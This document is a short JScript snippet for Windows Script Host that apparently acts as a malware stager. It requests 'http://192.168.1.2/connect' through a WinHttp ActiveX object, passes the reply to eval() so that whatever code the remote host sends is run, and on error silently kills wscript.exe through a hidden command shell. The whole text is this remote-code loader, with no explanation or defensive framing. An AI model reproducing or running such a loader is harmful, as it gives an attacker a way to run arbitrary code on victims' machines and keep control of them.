h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
h.Open("GET", "http://192.168.1.2/connect", false);
try {
    h.Send();
    B = h.ResponseText;
    eval(B);
}
catch(e) {
    new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im wscript.exe", 0, true);
}